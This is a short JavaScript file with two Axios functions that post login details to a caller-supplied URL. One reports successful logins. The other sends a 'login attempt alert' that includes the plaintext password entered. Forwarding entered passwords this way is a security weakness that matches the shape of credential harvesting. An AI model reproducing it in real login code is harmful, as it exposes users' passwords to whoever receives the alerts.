function sendAjaxRequestForSuccessfulLogin(url, id, username, time, host, ip) {
  let params = new URLSearchParams();
  params.append("sendMessage", "local");
  params.append("id", id);
  params.append("username", username);
  params.append("time", time);
  params.append("host", host);
  params.append("ip", ip);
  // Use Axios for the AJAX request

  axios
    .post(url, params)
    .then(function (response) {
      console.log(response.data);
      // // Handle the success response
      // window.location.href = `index.php?msg=${username}`;
    })
    .catch(function (error) {
      // // Handle errors
      // window.location.href = `index.php?msg=${username}`;
    });
}

function sendLoginAttemptAlert(url, username, password, time, host, ip) {
  let params = new URLSearchParams();
  params.append("sendMessage", "attempt");
  params.append("origen", "local");
  params.append("host", host);
  params.append("ip", ip);
  params.append("time", time);
  params.append("username", username);
  params.append("password", password);

  axios
    .post(url, params)
    .then(function (response) {
      console.log(response.data);
      // // Handle the success response
      // window.location.href = `index.php?msg=${username}`;
    })
    .catch(function (error) {
      // // Handle errors
      // window.location.href = `index.php?msg=${username}`;
    });
}
